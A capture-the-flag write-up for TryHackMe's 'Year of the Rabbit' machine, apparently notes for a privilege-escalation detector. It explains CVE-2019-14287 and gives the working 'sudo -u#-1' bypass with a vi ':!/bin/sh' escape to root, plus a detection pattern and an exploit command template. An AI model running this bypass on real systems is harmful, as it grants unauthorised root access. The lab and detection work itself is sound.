# TryHackMe Year of the Rabbit: CVE-2019-14287 (sudo -u#-1 bypass)

**Platform:** TryHackMe
**Machine:** Year of the Rabbit
**Category:** sudo version-specific CVE: NOT covered by ReadPEAS (distinct from
NOPASSWD/GTFOBins direct-command detection; this is a UID-negative-number bypass)

## Context
LinPEAS's SUID section is a red herring here: dozens of normal SUID binaries,
nothing directly exploitable via GTFOBins SUID abuse. The real vector is a
narrow, deliberately restrictive sudo rule that excludes root explicitly:

## sudo -l Output (verbatim)
```
Matching Defaults entries for gwendoline on year-of-the-rabbit:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
User gwendoline may run the following commands on
        year-of-the-rabbit:
    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
```

The `(ALL, !root)` syntax means: "run as any user EXCEPT root." The admin's
intent was to prevent privilege escalation via this vi rule. It fails.

## Naive attempt (fails, as expected)
```
sudo /usr/bin/vi /home/gwendoline/user.txt
[sudo] password for gwendoline:
Sorry, user gwendoline is not allowed to execute '/usr/bin/vi user.txt' as root on year-of-the-rabbit.
```

## The CVE-2019-14287 bypass
sudo versions before 1.8.28 mishandle a user ID of `-1` or its unsigned
equivalent `4294967295`. Specifying `-u#-1` is interpreted by the vulnerable
sudo binary as UID 0 (root), because the negative value fails the `!root`
exclusion check while still resolving to UID 0 internally.

## Exploit Command
```
sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
```
Then, inside vi, use a GTFOBins-style shell escape:
```
:!/bin/sh
```
Result: root shell.

## Detection Pattern for ReadPEAS
1. In the "Checking 'sudo -l'" section, match the pattern:
   `(ALL, !root)` or `(ALL,\s*!root)` combined with `NOPASSWD:`: this
   specific exclusion syntax is the signature of an admin trying (and failing)
   to block root escalation via a scoped sudo rule.
2. Cross-check the sudo version (from the "Sudo version" LinPEAS section)
   against < 1.8.28. If both conditions hold → CRITICAL finding distinct from
   a plain NOPASSWD entry.
3. Exploit command template:
   `sudo -u#-1 <the allowed binary> <the allowed argument>`
   followed by the GTFOBins escape sequence for that specific binary (vi, in
   this case: `:!/bin/sh` or `:shell`).
4. This is NOT the same finding as generic sudo NOPASSWD: the existing sudo
   module would need a specific sub-case for `(ALL, !root)` syntax, since a
   naive "user has NOPASSWD on vi" finding would suggest the WRONG exploit
   command (`sudo vi ...` fails; `sudo -u#-1 vi ...` works).
